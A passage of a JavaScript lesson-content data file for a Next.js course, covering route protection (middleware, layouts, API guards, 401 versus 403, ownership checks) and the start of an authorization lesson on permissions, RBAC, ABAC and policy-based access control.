const { data: session } = useSession();

if (!session) {
  return <Login />;
}`
          },
          {
            type: "paragraph",
            content: "Client-side protection is useful for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Interactive dashboards",
              "User preferences",
              "Client-only widgets",
              "SPA navigation"
            ]
          },
          {
            type: "paragraph",
            content: "However, it should not be the primary security mechanism."
          }
        ]
      },
      {
        heading: "Client-side Protection Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Load Page", "→",
              "Fetch Session", "→",
              "Authenticated?", "→",
              "Yes", "→",
              "Show Content"
            ]
          },
          {
            type: "paragraph",
            content: "Notice the difference."
          },
          {
            type: "paragraph",
            content: "The browser loads first."
          },
          {
            type: "paragraph",
            content: "The check happens afterward."
          }
        ]
      },
      {
        heading: "Loading States",
        blocks: [
          {
            type: "paragraph",
            content: "Client-side authentication usually requires loading UI."
          },
          {
            type: "paragraph",
            content: "Without loading:"
          },
          {
            type: "flow",
            steps: [
              "Dashboard", "→",
              "Login", "→",
              "Dashboard", "→",
              "Login"
            ]
          },
          {
            type: "paragraph",
            content: "The page flickers."
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "flow",
            steps: [
              "Loading...", "→",
              "Authentication Complete", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const { data, status } = useSession();

if (status === "loading") {
  return <LoadingSpinner />;
}`
          },
          {
            type: "paragraph",
            content: "Always handle loading states."
          }
        ]
      },
      {
        heading: "Middleware Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Middleware runs before your application."
          },
          {
            type: "flow",
            steps: [
              "Incoming Request", "→",
              "Middleware", "→",
              "Authentication", "→",
              "Continue or Redirect"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { NextResponse } from "next/server";

export function middleware(request) {
  const token = request.cookies.get("token");

  if (!token) {
    return NextResponse.redirect(new URL("/login", request.url));
  }

  return NextResponse.next();
}`
          },
          {
            type: "paragraph",
            content: "Middleware is excellent for protecting multiple routes."
          }
        ]
      },
      {
        heading: "Middleware Matcher",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of protecting everything:"
          },
          {
            type: "code",
            language: "javascript",
            content: `export const config = {
  matcher: ["/dashboard/:path*"],
};`
          },
          {
            type: "paragraph",
            content: "Now every dashboard page is protected automatically."
          },
          {
            type: "output",
            content: [
              "/dashboard",
              "",
              "/dashboard/profile",
              "",
              "/dashboard/orders",
              "",
              "/dashboard/settings"
            ]
          },
          {
            type: "paragraph",
            content: "All use the same Middleware."
          }
        ]
      },
      {
        heading: "Layout Protection",
        blocks: [
          {
            type: "paragraph",
            content: "App Router introduces Layouts."
          },
          {
            type: "paragraph",
            content: "Instead of checking every page:"
          },
          {
            type: "tree",
            content: `dashboard/
layout.tsx
page.tsx
orders/page.tsx
settings/page.tsx
analytics/page.tsx`
          },
          {
            type: "paragraph",
            content: "Protect the layout once."
          },
          {
            type: "flow",
            steps: [
              "Layout", "→",
              "Authentication", "→",
              "Children Pages"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `export default async function DashboardLayout({
  children,
}) {
  const session = await auth();

  if (!session) {
    redirect("/login");
  }

  return children;
}`
          },
          {
            type: "paragraph",
            content: "Every child route automatically becomes protected."
          }
        ]
      },
      {
        heading: "Route Handlers Protection",
        blocks: [
          {
            type: "paragraph",
            content: "API endpoints must also be protected."
          },
          {
            type: "paragraph",
            content: "Never assume only pages require authentication."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `export async function GET() {
  const session = await auth();

  if (!session) {
    return Response.json(
      { error: "Unauthorized" },
      { status: 401 }
    );
  }

  return Response.json({
    message: "Protected Data",
  });
}`
          }
        ]
      },
      {
        heading: "API Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Every API request should verify authentication."
          },
          {
            type: "flow",
            steps: [
              "Client", "→",
              "API Request", "→",
              "Authentication", "→",
              "Database", "→",
              "Response"
            ]
          },
          {
            type: "paragraph",
            content: "Never trust:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Hidden buttons",
              "Disabled UI",
              "Client-side checks"
            ]
          },
          {
            type: "paragraph",
            content: "Always verify on the server."
          }
        ]
      },
      {
        heading: "Redirects",
        blocks: [
          {
            type: "paragraph",
            content: "Unauthenticated users are usually redirected."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `redirect("/login");`
          },
          {
            type: "paragraph",
            content: "Common redirect flow:"
          },
          {
            type: "flow",
            steps: [
              "Dashboard", "→",
              "Not Logged In", "→",
              "Login", "→",
              "Authenticate", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Many applications also remember the intended destination."
          },
          {
            type: "output",
            content: [
              "/login?next=/dashboard/orders"
            ]
          },
          {
            type: "paragraph",
            content: "After login:"
          },
          {
            type: "flow",
            steps: [
              "Redirect Back"
            ]
          },
          {
            type: "paragraph",
            content: "This creates a better user experience."
          }
        ]
      },
      {
        heading: "Unauthorized Pages",
        blocks: [
          {
            type: "paragraph",
            content: "Sometimes redirecting isn't appropriate."
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "output",
            content: [
              "Access Denied",
              "",
              "You don't have permission."
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `return (
  <h1>Unauthorized</h1>
);`
          },
          {
            type: "paragraph",
            content: "Useful for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Internal tools",
              "Admin dashboards",
              "Enterprise software"
            ]
          }
        ]
      },
      {
        heading: "401 vs 403",
        blocks: [
          {
            type: "paragraph",
            content: "One of the most misunderstood HTTP concepts."
          },
          {
            type: "paragraph",
            content: "401 Unauthorized"
          },
          {
            type: "paragraph",
            content: "Means:"
          },
          {
            type: "output",
            content: [
              "You are not authenticated."
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Login Required"
            ]
          },
          {
            type: "paragraph",
            content: "403 Forbidden"
          },
          {
            type: "paragraph",
            content: "Means:"
          },
          {
            type: "output",
            content: [
              "You are authenticated but not allowed."
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Employee Logged In", "→",
              "Trying to Access\n\n/Admin", "→",
              "403 Forbidden"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication succeeded."
          },
          {
            type: "paragraph",
            content: "Authorization failed."
          }
        ]
      },
      {
        heading: "Nested Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Large applications often contain nested protected sections."
          },
          {
            type: "tree",
            content: `Dashboard
├── Profile
├── Orders
├── Billing
└── Admin`
          },
          {
            type: "paragraph",
            content: "Each level can perform additional checks."
          },
          {
            type: "flow",
            steps: [
              "Dashboard", "→",
              "Authenticated", "→",
              "Admin", "→",
              "Admin Role?", "→",
              "Yes"
            ]
          },
          {
            type: "paragraph",
            content: "Protection becomes hierarchical."
          }
        ]
      },
      {
        heading: "Dynamic Routes",
        blocks: [
          {
            type: "paragraph",
            content: "Dynamic routes also require authentication."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "/orders/123",
              "",
              "/orders/456",
              "",
              "/orders/789"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication alone isn't enough."
          },
          {
            type: "paragraph",
            content: "You must also verify ownership."
          },
          {
            type: "flow",
            steps: [
              "User A", "→",
              "Order 123", "→",
              "Database", "→",
              "Owner?", "→",
              "Yes"
            ]
          },
          {
            type: "paragraph",
            content: "Otherwise:"
          },
          {
            type: "flow",
            steps: [
              "User A", "→",
              "Order 999", "→",
              "Belongs to User B", "→",
              "403"
            ]
          },
          {
            type: "paragraph",
            content: "This prevents Insecure Direct Object Reference (IDOR) vulnerabilities."
          }
        ]
      },
      {
        heading: "Performance Considerations",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication checks add overhead."
          },
          {
            type: "paragraph",
            content: "Production systems optimize by:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Using signed cookies",
              "Caching session lookups where appropriate",
              "Verifying JWTs locally",
              "Minimizing unnecessary database queries",
              "Protecting layouts instead of individual pages",
              "Using Middleware selectively"
            ]
          },
          {
            type: "paragraph",
            content: "Avoid checking authentication multiple times during a single request unless necessary."
          }
        ]
      },
      {
        heading: "SEO Implications",
        blocks: [
          {
            type: "paragraph",
            content: "Protected pages generally should not be indexed by search engines."
          },
          {
            type: "paragraph",
            content: "For authenticated pages:"
          },
          {
            type: "output",
            content: [
              "Dashboard",
              "",
              "Orders",
              "",
              "Billing",
              "",
              "Admin"
            ]
          },
          {
            type: "paragraph",
            content: "Search engines cannot access them because authentication is required."
          },
          {
            type: "paragraph",
            content: "Public pages remain crawlable."
          },
          {
            type: "paragraph",
            content: "Server-side protection also prevents accidental exposure of sensitive HTML to crawlers."
          }
        ]
      },
      {
        heading: "Production Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "A large-scale application usually protects requests at multiple layers."
          },
          {
            type: "code",
            language: "text",
            content: `                Browser
                    │
                    ▼
              Middleware
                    │
     Verify Session / JWT
                    │
          ┌─────────┴─────────┐
          ▼                   ▼
 Redirect Login         Continue
                              │
                              ▼
                    Layout Authentication
                              │
                              ▼
                      Server Component
                              │
                              ▼
                     Route Handler / API
                              │
                              ▼
                  Authorization Check
                              │
                              ▼
                         Database
                              │
                              ▼
                         Response`
          },
          {
            type: "paragraph",
            content: "This layered approach is known as defense in depth. Even if one layer is bypassed, another layer still protects the application."
          }
        ]
      },
      {
        heading: "Best Practices",
        blocks: [
          {
            type: "paragraph",
            content: "Protect on the Server Whenever Possible"
          },
          {
            type: "paragraph",
            content: "Server-side checks prevent sensitive data from ever reaching the browser."
          },
          {
            type: "paragraph",
            content: "Use Middleware for Shared Protection"
          },
          {
            type: "paragraph",
            content: "Protect groups of routes instead of repeating logic."
          },
          {
            type: "paragraph",
            content: "Protect Layouts"
          },
          {
            type: "paragraph",
            content: "Authenticate once for an entire section of your application."
          },
          {
            type: "paragraph",
            content: "Always Protect APIs"
          },
          {
            type: "paragraph",
            content: "Every API endpoint should independently verify authentication."
          },
          {
            type: "paragraph",
            content: "Return Correct HTTP Status Codes"
          },
          {
            type: "paragraph",
            content: "Use:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "401 for unauthenticated requests.",
              "403 for authenticated users without permission."
            ]
          },
          {
            type: "paragraph",
            content: "Validate Resource Ownership"
          },
          {
            type: "paragraph",
            content: "Never assume an authenticated user can access every resource."
          },
          {
            type: "paragraph",
            content: "Always verify ownership or permissions before returning data."
          },
          {
            type: "paragraph",
            content: "Preserve Intended Destinations"
          },
          {
            type: "paragraph",
            content: "Redirect users back to the page they originally requested after successful login to improve user experience."
          },
          {
            type: "paragraph",
            content: "Avoid Duplicate Authentication Checks"
          },
          {
            type: "paragraph",
            content: "If a layout has already verified the session, child pages often don't need to repeat the same check unless additional permissions are required."
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Relying Only on Client-side Protection: JavaScript can be bypassed or disabled. Security must be enforced on the server.",
              "Forgetting to Protect APIs: Many developers secure pages but leave API endpoints exposed.",
              "Using 401 Instead of 403: These status codes represent different situations and should not be used interchangeably.",
              "Exposing Sensitive Data Before Redirect: Fetching private data before authentication checks can leak information. Authenticate first, fetch second.",
              "Ignoring Dynamic Route Validation: Checking only that a user is logged in is insufficient. Always ensure they are allowed to access the specific resource they requested.",
              "Applying Middleware to Every Route: Protect only the routes that need it. Overusing Middleware can add unnecessary latency to public pages."
            ]
          }
        ]
      },
      {
        heading: "DevSphere Special Note",
        blocks: [
          {
            type: "note",
            content: "A common misconception is that hiding a page or button in the UI makes it secure. It does not. For example, if an \"Admin Panel\" button is hidden for regular users but the /admin route and its API endpoints remain accessible, anyone who knows the URL can still attempt to access them. Think of route protection as a layered security model: Middleware filters requests early. Layouts protect entire application sections. Server Components verify sessions before rendering. Route Handlers and APIs enforce authentication and authorization. Database queries validate ownership and permissions. Professional applications don't rely on just one layer—they combine multiple layers so that if one fails, another still prevents unauthorized access."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "Protected routes are the foundation of secure Next.js applications. They ensure that only authenticated users—and, where appropriate, authorized users—can access sensitive pages, APIs, layouts, and resources."
          },
          {
            type: "paragraph",
            content: "In this lesson, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Why protected routes are essential.",
              "How authentication guards work.",
              "The complete route protection workflow.",
              "Server-side, client-side, and Middleware-based protection.",
              "Protecting layouts, Route Handlers, and APIs.",
              "Redirect strategies and loading states.",
              "The difference between 401 Unauthorized and 403 Forbidden.",
              "Protecting nested and dynamic routes.",
              "Performance and SEO considerations.",
              "Production architecture and best practices.",
              "Common mistakes to avoid."
            ]
          },
          {
            type: "paragraph",
            content: "With this knowledge, you can design applications where security is enforced consistently across every layer—from the initial request all the way to the database—providing both a safe user experience and a maintainable architecture."
          }
        ]
      }
    ]
  },




  /* ===========================
    Sixth Topic : Authorization
============================= */
    "nextjs-authorization": {
    title: "Authorization",
    readingTime: "30 min",
        
    content: [
      {
        heading: "Authorization in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Goal: Learn how to decide what authenticated users are allowed to do, build secure authorization systems, and implement production-ready access control in Next.js applications."
          }
        ]
      },
      {
        heading: "Introduction",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication answers the question:"
          },
          {
            type: "output",
            content: [
              "\"Who are you?\""
            ]
          },
          {
            type: "paragraph",
            content: "Authorization answers the next question:"
          },
          {
            type: "output",
            content: [
              "\"What are you allowed to do?\""
            ]
          },
          {
            type: "paragraph",
            content: "Many beginners believe that once a user logs in, they can access everything. In reality, login only proves identity. Authorization determines permissions."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Alice is an Admin.",
              "Bob is an Editor.",
              "Charlie is a Customer."
            ]
          },
          {
            type: "paragraph",
            content: "All three are authenticated users."
          },
          {
            type: "paragraph",
            content: "But only the Admin should delete users."
          },
          {
            type: "paragraph",
            content: "Only the Editor should publish articles."
          },
          {
            type: "paragraph",
            content: "Customers should only manage their own accounts."
          },
          {
            type: "paragraph",
            content: "This decision-making process is called Authorization."
          }
        ]
      },
      {
        heading: "Why Authorization Exists",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an online banking application."
          },
          {
            type: "paragraph",
            content: "Without authorization:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Every logged-in user could transfer money from any account.",
              "Every employee could change salaries.",
              "Every customer could access confidential reports."
            ]
          },
          {
            type: "paragraph",
            content: "Clearly this would be disastrous."
          },
          {
            type: "paragraph",
            content: "Authorization exists to protect:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Sensitive resources",
              "User privacy",
              "Company data",
              "Business rules",
              "Legal compliance"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication gets users into the building."
          },
          {
            type: "paragraph",
            content: "Authorization decides which rooms they may enter."
          }
        ]
      },
      {
        heading: "Authentication vs Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "These concepts are closely related but completely different."
          },
          {
            type: "table",
            headers: ["Authentication", "Authorization"],
            rows: [
              ["Verifies identity", "Verifies permissions"],
              ["Login process", "Permission checking"],
              ["Happens first", "Happens after authentication"],
              ["Uses credentials", "Uses roles, permissions and policies"],
              ["Answers \"Who are you?\"", "Answers \"What can you do?\""]
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User enters email/password", "→",
              "Authentication succeeds", "→",
              "User identity established", "→",
              "Authorization checks permissions", "→",
              "Allow or deny request"
            ]
          },
          {
            type: "paragraph",
            content: "Without authentication, authorization usually cannot happen because the system doesn't know who the user is."
          }
        ]
      },
      {
        heading: "Understanding Access Control",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization is implemented using Access Control."
          },
          {
            type: "paragraph",
            content: "Access control is the collection of rules that determine whether an action is permitted."
          },
          {
            type: "paragraph",
            content: "Think of it like airport security."
          },
          {
            type: "paragraph",
            content: "Airport security checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Who you are",
              "Which ticket you have",
              "Which gate you're assigned",
              "Whether you're staff or passenger"
            ]
          },
          {
            type: "paragraph",
            content: "Similarly, software checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User identity",
              "User role",
              "Requested resource",
              "Requested action"
            ]
          },
          {
            type: "paragraph",
            content: "Only if all conditions are satisfied is access granted."
          }
        ]
      },
      {
        heading: "Core Components of Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Almost every authorization system consists of four building blocks."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Action", "→",
              "Resource", "→",
              "Permission Decision"
            ]
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "output",
            content: [
              "User:",
              "Alice",
              "",
              "Action:",
              "Delete",
              "",
              "Resource:",
              "Article #25",
              "",
              "Decision:",
              "Allowed"
            ]
          },
          {
            type: "paragraph",
            content: "Or"
          },
          {
            type: "output",
            content: [
              "User:",
              "Customer",
              "",
              "Action:",
              "Delete",
              "",
              "Resource:",
              "Another customer's order",
              "",
              "Decision:",
              "Denied"
            ]
          }
        ]
      },
      {
        heading: "Permissions",
        blocks: [
          {
            type: "paragraph",
            content: "Permissions are the smallest authorization unit."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "create_post",
              "read_post",
              "edit_post",
              "delete_post",
              "manage_users",
              "view_reports",
              "publish_article"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of giving users unlimited access, applications assign specific permissions."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "paragraph",
            content: "Admin"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ create",
              "✓ edit",
              "✓ delete",
              "✓ manage users",
              "✓ publish"
            ]
          },
          {
            type: "paragraph",
            content: "Editor"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ create",
              "✓ edit",
              "✓ publish",
              "✗ delete users"
            ]
          },
          {
            type: "paragraph",
            content: "Customer"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "✓ read",
              "✓ purchase",
              "✗ manage inventory"
            ]
          },
          {
            type: "paragraph",
            content: "Permissions provide fine-grained control."
          }
        ]
      },
      {
        heading: "Resources",
        blocks: [
          {
            type: "paragraph",
            content: "A resource is anything users want to access."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Blog posts",
              "Orders",
              "Products",
              "Dashboard",
              "User profiles",
              "Images",
              "Files",
              "Database records",
              "Reports",
              "APIs"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization always protects resources."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "output",
            content: [
              "GET /orders/52"
            ]
          },
          {
            type: "paragraph",
            content: "The resource is:"
          },
          {
            type: "output",
            content: [
              "Order #52"
            ]
          },
          {
            type: "paragraph",
            content: "The system must verify whether the current user may view it."
          }
        ]
      },
      {
        heading: "Actions",
        blocks: [
          {
            type: "paragraph",
            content: "Actions describe what users want to do."
          },
          {
            type: "paragraph",
            content: "Common actions include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Create",
              "Read",
              "Update",
              "Delete"
            ]
          },
          {
            type: "paragraph",
            content: "Also called CRUD."
          },
          {
            type: "paragraph",
            content: "Other actions include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Publish",
              "Approve",
              "Reject",
              "Export",
              "Archive",
              "Download",
              "Upload",
              "Invite users",
              "Change password"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization combines actions with resources."
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Can user UPDATE product?",
              "Can user DELETE comment?",
              "Can user EXPORT report?"
            ]
          }
        ]
      },
      {
        heading: "Ownership",
        blocks: [
          {
            type: "paragraph",
            content: "One of the most common authorization rules is ownership."
          },
          {
            type: "paragraph",
            content: "Users can access resources they own."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "paragraph",
            content: "User A"
          },
          {
            type: "output",
            content: [
              "Orders:",
              "",
              "101",
              "",
              "102"
            ]
          },
          {
            type: "paragraph",
            content: "User B"
          },
          {
            type: "output",
            content: [
              "Orders:",
              "",
              "201",
              "",
              "202"
            ]
          },
          {
            type: "paragraph",
            content: "User A requests:"
          },
          {
            type: "output",
            content: [
              "GET /orders/201"
            ]
          },
          {
            type: "paragraph",
            content: "The authorization system checks:"
          },
          {
            type: "output",
            content: [
              "Does User A own Order 201?",
              "",
              "No.",
              "",
              "Access denied."
            ]
          },
          {
            type: "paragraph",
            content: "Ownership is widely used in:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Social media",
              "E-commerce",
              "Banking",
              "Project management",
              "File storage"
            ]
          }
        ]
      },
      {
        heading: "Resource-Based Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Resource-Based Authorization checks permissions based on the resource itself."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Can Alice edit Article #20?"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of checking only the user's role, the system checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Resource owner",
              "Resource status",
              "Resource visibility",
              "Organization membership"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if(article.authorId === user.id)

Allow edit

else

Deny`
          },
          {
            type: "paragraph",
            content: "This approach is flexible because permissions depend on the actual resource."
          },
          {
            type: "paragraph",
            content: "Common examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Editing your own profile",
              "Viewing your own invoices",
              "Deleting your own comments"
            ]
          }
        ]
      },
      {
        heading: "Permission-Based Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Permission-based authorization assigns permissions directly to users or through roles."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Permissions", "→",
              "Action"
            ]
          },
          {
            type: "paragraph",
            content: "Example permission list:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "read:users",
              "edit:users",
              "delete:users",
              "manage:roles",
              "create:reports"
            ]
          },
          {
            type: "paragraph",
            content: "Checking permissions becomes simple:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (user.permissions.includes("delete:users")) {
  deleteUser();
}`
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Very flexible",
              "Easy to extend",
              "Enterprise-friendly"
            ]
          }
        ]
      },
      {
        heading: "Policy-Based Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of hardcoding rules, policy-based authorization stores authorization logic in reusable policies."
          },
          {
            type: "paragraph",
            content: "Example policy:"
          },
          {
            type: "output",
            content: [
              "Editors can edit published articles.",
              "",
              "Admins can edit everything.",
              "",
              "Authors can edit only their own drafts."
            ]
          },
          {
            type: "paragraph",
            content: "Instead of writing conditions throughout the application, everything lives in one policy layer."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Can user edit article?", "→",
              "Policy Engine", "→",
              "Allow or Deny"
            ]
          },
          {
            type: "paragraph",
            content: "Benefits:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Centralized rules",
              "Easier maintenance",
              "Fewer bugs",
              "Better scalability"
            ]
          },
          {
            type: "paragraph",
            content: "Many enterprise applications use dedicated policy engines for this purpose."
          }
        ]
      },
      {
        heading: "Attribute-Based Access Control (ABAC)",
        blocks: [
          {
            type: "paragraph",
            content: "ABAC is one of the most flexible authorization models."
          },
          {
            type: "paragraph",
            content: "Instead of checking only roles, it evaluates multiple attributes."
          },
          {
            type: "paragraph",
            content: "Examples of attributes:"
          },
          {
            type: "paragraph",
            content: "User attributes"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Department",
              "Country",
              "Clearance level",
              "Subscription plan"
            ]
          },
          {
            type: "paragraph",
            content: "Resource attributes"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Owner",
              "Visibility",
              "Classification"
            ]
          },
          {
            type: "paragraph",
            content: "Environment attributes"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Time",
              "Device",
              "IP address",
              "Location"
            ]
          },
          {
            type: "paragraph",
            content: "Example rule:"
          },
          {
            type: "output",
            content: [
              "Allow if:",
              "",
              "User Department = Finance",
              "",
              "AND",
              "",
              "Resource Department = Finance",
              "",
              "AND",
              "",
              "Working hours",
              "",
              "AND",
              "",
              "Corporate VPN"
            ]
          },
          {
            type: "paragraph",
            content: "ABAC is powerful because permissions adapt dynamically."
          }
        ]
      },
      {
        heading: "Context-Aware Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Modern applications increasingly make authorization decisions based on context."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "paragraph",
            content: "Allow editing only when:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User is online",
              "MFA is completed",
              "Request originates from trusted device",
              "Request comes from approved country",
              "Business hours",
              "Organization subscription is active"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Role", "→",
              "Device", "→",
              "Location", "→",
              "Time", "→",
              "Decision"
            ]
          },
          {
            type: "paragraph",
            content: "This greatly improves security."
          }
        ]
      },
      {
        heading: "Authorization Lifecycle",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization isn't a single check—it happens throughout the request lifecycle."
          },
          {
            type: "flow",
            steps: [
              "User Request", "→",
              "Authentication", "→",
              "Load User", "→",
              "Load Roles", "→",
              "Load Permissions", "→",
              "Load Resource", "→",
              "Apply Policies", "→",
              "Allow / Deny", "→",
              "Return Response"
            ]
          },
          {
            type: "paragraph",
            content: "Every protected request follows this general flow."
          }
        ]
      },
      {
        heading: "API Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization is just as important for APIs as for pages."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "DELETE /api/users/5"
            ]
          },
          {
            type: "paragraph",
            content: "The API should verify:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Is the user logged in?",
              "Does the user have permission?",
              "Is the user an admin?",
              "Is this resource allowed?"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "typescript",
            content: `export async function DELETE(req: Request) {
  const session = await auth()

  if (!session)
    return Response.json(
      { error: "Unauthorized" },
      { status: 401 }
    )

  if (session.user.role !== "admin")
    return Response.json(
      { error: "Forbidden" },
      { status: 403 }
    )

  // Delete user
}`
          },
          {
            type: "paragraph",
            content: "Never trust client-side authorization alone."
          },
          {
            type: "paragraph",
            content: "Every API should validate permissions independently."
          }
        ]
      },
      {
        heading: "Database Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization should continue even after reaching the database."
          },
          {
            type: "paragraph",
            content: "Never query data without filtering by permissions."
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "code",
            language: "sql",
            content: `SELECT *
FROM Orders;`
          },
          {
            type: "paragraph",
            content: "Good:"
          },
          {
            type: "code",
            language: "sql",
            content: `SELECT *
FROM Orders
WHERE userId = currentUserId;`
          },
          {
            type: "paragraph",
            content: "Another example:"
          },
          {
            type: "paragraph",
            content: "Instead of:"
          },
          {
            type: "output",
            content: [
              "GET all invoices"
            ]
          },
          {
            type: "paragraph",
            content: "Use:"
          },
          {
            type: "output",
            content: [
              "GET invoices",
              "",
              "WHERE owner = current user"
            ]
          },
          {
            type: "paragraph",
            content: "This prevents accidental data leaks."
          }
        ]
      },
      {
        heading: "Real-World Authorization Examples",
        blocks: [
          {
            type: "paragraph",
            content: "Social Media"
          },
          {
            type: "paragraph",
            content: "Users can:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Edit their own posts",
              "Delete their own comments",
              "Report other users"
            ]
          },
          {
            type: "paragraph",
            content: "Admins can:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Delete any content",
              "Ban users",
              "Moderate discussions"
            ]
          },
          {
            type: "paragraph",
            content: "E-commerce"
          },
          {
            type: "paragraph",
            content: "Customer:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "View own orders",
              "Cancel pending orders"
            ]
          },
          {
            type: "paragraph",
            content: "Seller:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Manage products",
              "View inventory"
            ]
          },
          {
            type: "paragraph",
            content: "Admin:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Refund payments",
              "Manage sellers",
              "Access analytics"
            ]
          },
          {
            type: "paragraph",
            content: "SaaS Dashboard"
          },
          {
            type: "paragraph",
            content: "Member:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "View projects"
            ]
          },
          {
            type: "paragraph",
            content: "Manager:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Edit projects"
            ]
          },
          {
            type: "paragraph",
            content: "Owner:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Billing",
              "Team management",
              "Organization settings"
            ]
          },
          {
            type: "paragraph",
            content: "Banking"
          },
          {
            type: "paragraph",
            content: "Customer:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Transfer own money"
            ]
          },
          {
            type: "paragraph",
